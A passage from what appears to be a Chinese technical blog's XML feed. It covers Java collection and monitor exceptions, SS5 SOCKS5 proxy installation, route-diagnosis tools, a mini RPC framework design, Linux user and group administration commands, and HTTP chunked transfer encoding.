解决方法使用<code>CopyOnWriteArrayList</code>替代<code>ArrayList</code>。</p></li><li><p>java.lang.UnsupportedOperationException</p><p>  容器逸出时，为了避免容器被修改可以使用<code>Collections.unmodifiable(Map|List)</code>等静态方法包装容器来保护原始容器不被修改。</p><p>  调用这些容器的修改操作(add&#x2F;remove)时会抛出UnsupportedOperationException异常。</p><p>  另外：<code>Arrays.asList</code>方法返回的是一个<code>fixed-size</code>list，我们调用它的修改成操作时也会抛出<code>UnsupportedOperationException</code>异常。对其重新封装<code>new ArrayList&lt;&gt;(Arrays.asList(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;))</code>后就不会出现此问题。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; strs = Collections.unmodifiableList(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>)));</span><br><span class="line">strs.remove(<span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>java.lang.IllegalMonitorStateException</p><p>  这在我们调用对象的<code>wait</code>或者<code>notify/notifyAll</code>时会抛出，主要原因是我们没有获取被被调用对象的锁。</p><p>  错误示例：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">lock.wait(); </span><br><span class="line">doSomething();</span><br><span class="line">lock.notifyAll();</span><br></pre></td></tr></table></figure><p>  正确示例：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    lock.wait();</span><br><span class="line">    doSomething()</span><br><span class="line">    lock.notifyAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://book.douban.com/subject/10484692/">Java并发编程实战</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Sock5</title>
      <link href="/post/sock5.html"/>
      <url>/post/sock5.html</url>
      
        <content type="html"><![CDATA[<h2 id="Sock5"><a href="#Sock5" class="headerlink" title="Sock5"></a>Sock5</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li><p>环境准备</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install gcc automake autoconf libtool make</span><br><span class="line">yum -y install pam-devel openldap-devel cyrus-sasl-devel</span><br></pre></td></tr></table></figure></li><li><p>编译安装</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://sourceforge.net/projects/ss5/files/&gt;</span><br><span class="line">tar zxvf ss5-3.8.9-8.tar.gz</span><br><span class="line">cd ss5-3.8.9</span><br><span class="line">./configure  //notes:(默认是1080端口，如果想改端口的话，./configure –with-defaultport=5533</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></li><li><p>启动</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /etc/init.d/ss5</span><br><span class="line">/etc/init.d/ss5 start </span><br></pre></td></tr></table></figure></li></ol><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol><li><p>安装服务</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add ss5</span><br><span class="line">chkconfig ss5 on</span><br></pre></td></tr></table></figure></li><li><p>权限配置</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/opt/ss5/ss5.conf </span><br><span class="line"># 修改 SHost SPort Authentication </span><br><span class="line">auth 0.0.0.0/0 – -</span><br><span class="line">改为</span><br><span class="line">auth 0.0.0.0/0 – u</span><br><span class="line">permit – 0.0.0.0/0 – 0.0.0.0/0 – – – – -</span><br><span class="line">改成为</span><br><span class="line">permit u 0.0.0.0/0 – 0.0.0.0/0 – – – – -</span><br><span class="line"></span><br><span class="line"># 添加用户</span><br><span class="line">touch /etc/opt/ss5/ss5.passwd</span><br><span class="line">echo &quot;username password&quot; &gt; /etc/opt/ss5/ss5.passwd</span><br><span class="line"></span><br><span class="line"># 重启</span><br><span class="line">service ss5 restart</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.ttlsa.com/linux/linux-setup-socks-5-ttlsa/">linux下搭建socks 5代理</a></li><li><a href="http://awy.me/2014/06/yong-shadowsocks-he-proxifier-zi-you-fang-wen-hu-lian-wang/">用Proxifier自由访问互联网</a></li><li><a href="http://blackwolfsec.cc/2016/09/19/Proxifier_Shadowshocks/">Proxifier系统全局代理的正确姿势</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> sock5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由诊断</title>
      <link href="/post/traceroute.html"/>
      <url>/post/traceroute.html</url>
      
        <content type="html"><![CDATA[<h3 id="路由诊断"><a href="#路由诊断" class="headerlink" title="路由诊断"></a>路由诊断</h3><ol><li><p><a href="https://www.ipip.net/download.html#ip_trace">BestTrace</a><br> <img src="/images/1512385451690.jpg"></p></li><li><p><a href="https://github.com/traviscross/mtr">mtr</a><br> <img src="/images/QQ20171204-191523@2x.jpg"></p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://blog.51cto.com/xuanwei/1959268">网络连通性判断工具mtr命令</a></li><li><a href="https://moonagic.com/install-mtr-on-mac/">Mac安装mtr</a></li><li><a href="https://segmentfault.com/a/1190000000425751">如何用Linux命令行管理网络</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>迷你RPC</title>
      <link href="/post/mini-rpc.html"/>
      <url>/post/mini-rpc.html</url>
      
        <content type="html"><![CDATA[<h2 id="mini-dubbo"><a href="#mini-dubbo" class="headerlink" title="mini-dubbo"></a>mini-dubbo</h2><p>dubbo、thrift、grpc <a href="http://colobu.com/2016/09/05/benchmarks-of-popular-rpc-frameworks/">http://colobu.com/2016/09/05/benchmarks-of-popular-rpc-frameworks/</a></p><h3 id="主要设计架构"><a href="#主要设计架构" class="headerlink" title="主要设计架构"></a>主要设计架构</h3><ol><li><p>服务管理中心</p><ol><li>服务注册<br> zookeeper&#x2F;etcd</li></ol></li><li><p>RPC服务</p><ol><li>序列化协议<br> json&#x2F;<a href="http://wiki.geekdream.com/Specification/json-rpc_2.0.html">JSON-RPC</a>&#x2F;thrift&#x2F;protobuf</li><li>传输层<br> http netty&#x2F;sun-httpServer&#x2F;vert.x(防止主循环阻塞)</li></ol></li></ol><h3 id="json和thrift-protobuf比较"><a href="#json和thrift-protobuf比较" class="headerlink" title="json和thrift&#x2F;protobuf比较"></a>json和thrift&#x2F;protobuf比较</h3><ol><li><code>thrift/protobuf</code> 等协议序列化后字节更小、序列化速度更快。<code>json</code>存在冗余，序列化效率也没有前两者高。</li><li><code>thrift/protobuf</code> 需要定义schema，重新生成实体类（VO）。<code>json</code>可以直接使用现有实体类，我们只需要将<code>实体</code>和<code>Interface</code>对外发布即可。</li><li><code>thrift/protobuf</code> 序列化后无法阅读，对人类不友好。</li><li><code>thrift/protobuf</code> 能非常方便的实现跨语言序列化反序列化，<code>json</code>在跨语言时较麻烦。</li></ol><h3 id="注册服务协议"><a href="#注册服务协议" class="headerlink" title="注册服务协议"></a>注册服务协议</h3><p>类似dubbo，服务器启动、停止时去注册、注销服务即可。为了防止出现<code>kill -9</code>等情况下服务不能注销，可以添加心跳检查或者无响应自动剔除等功能。<br><img src="/images/zk-dubbo2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.1.3:20880/cc.kekek.dubbo.demo.DemoService?anyhost=true&amp;application=demo-provider&amp;dubbo=2.5.7&amp;generic=false&amp;interface=com.example.demo.DemoService&amp;methods=sayHello,sayName&amp;pid=54299&amp;side=provider&amp;timestamp=1511263842858</span><br></pre></td></tr></table></figure><h3 id="RPC-HTTP-协议"><a href="#RPC-HTTP-协议" class="headerlink" title="RPC(HTTP)协议"></a>RPC(HTTP)协议</h3><p>请求体类似 <code>multipart/form-data</code>，在原有协议上添加了type字段，用来定义此参数的实际类型。原有<code>Content-Type</code>也可以用来定义序列化格式<code>application/json</code>、<code>application/x-protobuf</code>、<code>application/x-thrift</code>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST http://www.example.com/invoke?interface=com.example.rpc.service.UserService&amp;method=hello&amp;parameters=java.lang.Integer,java.lang.String,com.example.rpc.model.User HTTP/1.1</span><br><span class="line">Content-Type:multipart/form-data; boundary=----RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line"></span><br><span class="line">------RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;args[0]&quot;; type=&quot;java.lang.Integer&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;args[1]&quot;; type=&quot;java.lang.String&quot;</span><br><span class="line"></span><br><span class="line">小明</span><br><span class="line">------RPCFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;args[2]&quot;; type=&quot;com.example.rpc.model.User&quot;</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:123,&quot;name&quot;:&quot;小明&quot;,&quot;age&quot;:18&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GET &#x2F;heartbeat 心跳接口</p></blockquote><h3 id="客户端伪代码"><a href="#客户端伪代码" class="headerlink" title="客户端伪代码"></a>客户端伪代码</h3><p>通过动态代理生成接口的实现类，通过动态代理在<code>invoke</code>方法里面发送网络请求到RPCServer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;service&#125;, (proxy, method, objects) -&gt; &#123;</span><br><span class="line">        Class&lt;?&gt; returnType = method.getReturnType();</span><br><span class="line">        Parameter[] parameters = method.getParameters();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> httpClient.post(<span class="string">&quot;http://localhost:1125/invoke&quot;</span>)</span><br><span class="line">            .addQuery(<span class="string">&quot;interface&quot;</span>, <span class="string">&quot;com.example.rpc.service.UserService&quot;</span>) <span class="comment">// serviceName</span></span><br><span class="line">            .addQuery(<span class="string">&quot;method&quot;</span>, method.getName())</span><br><span class="line">            .addQuery(<span class="string">&quot;parameters&quot;</span>, <span class="string">&quot;java.lang.Integer&quot;</span>) <span class="comment">// parameters type</span></span><br><span class="line">            .addBody(<span class="string">&#x27;123\r\n&#x27;</span>); <span class="comment">// objects</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JSON.parseObject(user, returnType);</span><br><span class="line">    &#125;); </span><br></pre></td></tr></table></figure><h3 id="服务器端伪代码"><a href="#服务器端伪代码" class="headerlink" title="服务器端伪代码"></a>服务器端伪代码</h3><p>首先根据<code>serviceName</code>获取具体实现类，然后获取具体的方法。最后通过反射调用调用实现类的方法即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(HttpRequest req, HttpResponse res)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">service</span> <span class="operator">=</span> req.getQuery(<span class="string">&#x27;service&#x27;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> req.getQuery(<span class="string">&#x27;method&#x27;</span>);</span><br><span class="line">    String[] parameters = req.getQuery(<span class="string">&#x27;parameters&#x27;</span>);</span><br><span class="line">    String[] body = req.getBody();</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> services.getBean(service);</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> bean.getMethod(methodName, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;...&#125;); <span class="comment">// parameters to Class </span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span>  method.invoke(bean, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;...&#125;); <span class="comment">// body to Object</span></span><br><span class="line"></span><br><span class="line">    res.json(returnValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 用户和用户组</title>
      <link href="/post/linux-user-group.html"/>
      <url>/post/linux-user-group.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-用户和用户组"><a href="#Linux-用户和用户组" class="headerlink" title="Linux 用户和用户组"></a>Linux 用户和用户组</h2><p>我们要进入<code>Linux</code>系统首先要输入我们的用户名，其实<code>Linux</code>并不认识这个用户名，它只认识这个用户名对应的ID - <code>UID</code>。用户名是给我们人类看的，<code>UID</code>才是给机器用的。除了用户名，我们还要输入密码。这样就能进入<code>Linux</code>系统了。</p><p>Linux下的用户和用户密码是以文本形式存分别存在<code>/etc/passwd</code>和<code>/etc/shadow</code>中。<code>/etc/passwd</code>里面存的数据是一个七元组，以<code>:</code>分割。</p><blockquote><p>用户名:密码:UID:GID:用户说明:用户目录:用户Shell</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">head</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br></pre></td></tr></table></figure><p>其中第二列密码列全部都是<code>x</code>，这是遗留问题。现在用户密码已经不在存在<code>/etc/passwd</code>文件中了，而是在<code>/etc/shadow</code>里面。最后一个<code>用户shell</code>是用户登录后使用的shell，如果我们不想让这个用户登录可以指定其shell为<code>/sbin/nologin</code>。</p><p>Linux中每一个用户都会至少属于一个用户组，这个用户组可以用来标识一批用户的关系。在文件权限管理中，我们可以设置组权限来实现同一个组下面的用户对文件的读写操作。同样，用户组的名字是给我们人类看的，用户组有一个ID - <code>GID</code>。用户组信息存放在<code>/etc/group</code>文件中，另外还有一个很少用的用户组密码，它存放在<code>/etc/gshadow</code>文件中。<code>/etc/group</code>存放的数据是一个四元组。</p><blockquote><p>群组名:群组密码:GID:群组下的用户</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ head /etc/group</span><br><span class="line">root:x:0:</span><br><span class="line">bin:x:1:bin,daemon</span><br><span class="line">daemon:x:2:bin,daemon</span><br><span class="line">sys:x:3:bin,adm</span><br><span class="line">adm:x:4:adm,daemon</span><br><span class="line">tty:x:5:</span><br><span class="line">disk:x:6:</span><br><span class="line">lp:x:7:daemon</span><br><span class="line">mem:x:8:</span><br><span class="line">kmem:x:9:</span><br></pre></td></tr></table></figure><p>这里的组密码同样是<code>x</code>，它存放在<code>/etc/gshadow</code>中。</p><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><ul><li><p>groupadd [-g] gid [-r] groupname<br>  -g  後面接某個特定的 GID ，用來直接給予某個 GID<br>  -r  建立系統群組啦！與 &#x2F;etc&#x2F;login.defs 內的 GID_MIN 有關。   </p></li><li><p>groupmod [-g gid] [-n group_name] 群組名<br>  -g  修改既有的 GID 數字<br>  -n  修改既有的群組名稱</p></li><li><p>groupdel [groupname]</p></li></ul><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><ul><li><p>useradd [-u UID] [-g 初始群組] [-G 次要群組] [-mM]\</p><blockquote><p> [-c 說明欄] [-d 家目錄絕對路徑] [-s shell] 使用者帳號名</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">\-u  ：後面接的是 UID ，是一組數字。直接指定一個特定的 UID 給這個帳號；</span><br><span class="line">\-g  ：後面接的那個群組名稱就是我們上面提到的 initial group 啦～</span><br><span class="line">    該群組的 GID 會被放置到 /etc/passwd 的第四個欄位內。</span><br><span class="line">\-G  ：後面接的群組名稱則是這個帳號還可以加入的群組。</span><br><span class="line">    這個選項與參數會修改 /etc/group 內的相關資料喔！</span><br><span class="line">\-M  ：強制！不要建立使用者家目錄！(系統帳號預設值)</span><br><span class="line">\-m  ：強制！要建立使用者家目錄！(一般帳號預設值)</span><br><span class="line">\-c  ：這個就是 /etc/passwd 的第五欄的說明內容啦～可以隨便我們設定的啦～</span><br><span class="line">\-d  ：指定某個目錄成為家目錄，而不要使用預設值。務必使用絕對路徑！</span><br><span class="line">\-r  ：建立一個系統的帳號，這個帳號的 UID 會有限制 (參考 /etc/login.defs)</span><br><span class="line">\-s  ：後面接一個 shell ，若沒有指定則預設是 /bin/bash 的啦～</span><br><span class="line">\-e  ：後面接一個日期，格式為『YYYY-MM-DD』此項目可寫入 shadow 第八欄位，</span><br><span class="line">    亦即帳號失效日的設定項目囉；</span><br><span class="line">\-f  ：後面接 shadow 的第七欄位項目，指定密碼是否會失效。0為立刻失效，</span><br><span class="line">    -1 為永遠不失效(密碼只會過期而強制於登入時重新設定而已。</span><br></pre></td></tr></table></figure></blockquote></li><li><p>usermod [-cdegGlsuLU] username </p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\-c  後面接帳號的說明，即 /etc/passwd 第五欄的說明欄，可以加入一些帳號的說明。</span><br><span class="line">\-d  後面接帳號的家目錄，即修改 /etc/passwd 的第六欄；</span><br><span class="line">\-e  後面接日期，格式是 YYYY-MM-DD 也就是在 /etc/shadow 內的第八個欄位資料啦！</span><br><span class="line">\-f  後面接天數，為 shadow 的第七欄位。</span><br><span class="line">\-g  後面接初始群組，修改 /etc/passwd 的第四個欄位，亦即是 GID 的欄位！</span><br><span class="line">\-G  後面接次要群組，修改這個使用者能夠支援的群組，修改的是 /etc/group 囉～</span><br><span class="line">\-a  與 -G 合用，可『增加次要群組的支援』而非『設定』喔！</span><br><span class="line">\-l  後面接帳號名稱。亦即是修改帳號名稱， /etc/passwd 的第一欄！</span><br><span class="line">\-s  後面接 Shell 的實際檔案，例如 /bin/bash 或 /bin/csh 等等。</span><br><span class="line">\-u  後面接 UID 數字啦！即 /etc/passwd 第三欄的資料；</span><br><span class="line">\-L  暫時將使用者的密碼凍結，讓他無法登入。其實僅改 /etc/shadow 的密碼欄。</span><br><span class="line">\-U  將 /etc/shadow 密碼欄的 ! 拿掉，解凍啦</span><br></pre></td></tr></table></figure></li><li><p>userdel [-r] username</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r  ：連同使用者的家目錄也一起刪除</span><br></pre></td></tr></table></figure></li><li><p>passwd [-l] [-u] [–stdin] [-S] \</p><blockquote><p> [-n 日數] [-x 日數] [-w 日數] [-i 日數] 帳號 &lt;&#x3D;&#x3D;root 功能</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\--stdin ：可以透過來自前一個管線的資料，作為密碼輸入，對 shell script 有幫助！</span><br><span class="line">\-l  ：是 Lock 的意思，會將 /etc/shadow 第二欄最前面加上 ! 使密碼失效；</span><br><span class="line">\-u  ：與 -l 相對，是 Unlock 的意思！</span><br><span class="line">\-S  ：列出密碼相關參數，亦即 shadow 檔案內的大部分資訊。</span><br><span class="line">\-n  ：後面接天數，shadow 的第 4 欄位，多久不可修改密碼天數</span><br><span class="line">\-x  ：後面接天數，shadow 的第 5 欄位，多久內必須要更動密碼</span><br><span class="line">\-w  ：後面接天數，shadow 的第 6 欄位，密碼過期前的警告天數</span><br><span class="line">\-i  ：後面接天數，shadow 的第 7 欄位，密碼失效天數</span><br></pre></td></tr></table></figure></blockquote></li><li><p>chage [-ldEImMW] 帳號名</p><blockquote><p>与 <code>passwd -S</code> 功能类似</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\-l ：列出該帳號的詳細密碼參數；</span><br><span class="line">\-d ：後面接日期，修改 shadow 第三欄位(最近一次更改密碼的日期)，格式 YYYY-MM-DD</span><br><span class="line">\-E ：後面接日期，修改 shadow 第八欄位(帳號失效日)，格式 YYYY-MM-DD</span><br><span class="line">\-I ：後面接天數，修改 shadow 第七欄位(密碼失效日期)</span><br><span class="line">\-m ：後面接天數，修改 shadow 第四欄位(密碼最短保留天數)</span><br><span class="line">\-M ：後面接天數，修改 shadow 第五欄位(密碼多久需要進行變更)</span><br><span class="line">\-W ：後面接天數，修改 shadow 第六欄位(密碼過期前警告日期)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>groups<br>  显示用户的有效群组</p></li><li><p>newgrp<br>  切换有效群组 （可以使用 usermod -G 为用户添加有效群组）</p></li><li><p>id [username]<br>  查询用户的UID、GID</p></li><li><p>chsh [-ls]</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-l  ：列出目前系統上面可用的 shell ，其實就是 /etc/shells 的內容！</span><br><span class="line">-s  ：設定修改自己的 Shell 囉</span><br></pre></td></tr></table></figure></li></ul><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><ul><li>chgrp [groupname] 文件<br>  修改文件所属组</li><li>chown<br>  修改文件所有者和组</li><li>chmod<br>  修改文件权限</li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>可以将多个用户设置同一个用户组，在文件组权限设置组可读。同组内的用户就可以共享文件。</p><blockquote><p>注意：对于文件夹要想读取必须要有执行权限。</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://linux.vbird.org/linux_basic/0410accountmanager.php">Linux 帳號管理與 ACL 權限設定</a>  </li><li><a href="http://www.cnblogs.com/bodhitree/p/6018369.html">Linux 下以其他用户身份运行程序—— su、sudo、runuser</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP 分块传输编码</title>
      <link href="/post/chunked-transfer-encoding.html"/>
      <url>/post/chunked-transfer-encoding.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP分块传输编码"><a href="#HTTP分块传输编码" class="headerlink" title="HTTP分块传输编码"></a>HTTP分块传输编码</h2><p>HTTP 分块传输编码是 <code>HTTP/1.1</code> 版本新增的内容。主要用于解决我们事先不太好确定内容大小的问题，每次可以只传输一部分内容。它的格式是首行一个十六进制的块大小，然后<code>\r\n</code>块正文。可以传输多个块，最后一个块大小0代表整个响应结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Content-Type: text/plain </span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">7\r\n</span><br><span class="line">Mozilla\r\n </span><br><span class="line">9\r\n</span><br><span class="line">Developer\r\n</span><br><span class="line">7\r\n</span><br><span class="line">Network\r\n</span><br><span class="line">0\r\n </span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><h3 id="头信息"><a href="#头信息" class="headerlink" title="头信息"></a>头信息</h3><ul><li><p>TE<br>用在请求首部中，告知服务器可以使用哪些传输编码扩展。如果这个首部起名叫 <code>Accept-Transfer-Encoding</code>，它的意义就会更直白。</p></li><li><p>Transfer-Encoding<br>告知接收方为了可靠地传输报文，已经对其进行了何种编码。</p></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding">Transfer-Encoding - MDN</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> transfer-encoding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx缓存配置</title>
      <link href="/post/nginx-proxy-cache.html"/>
      <url>/post/nginx-proxy-cache.html</url>
      
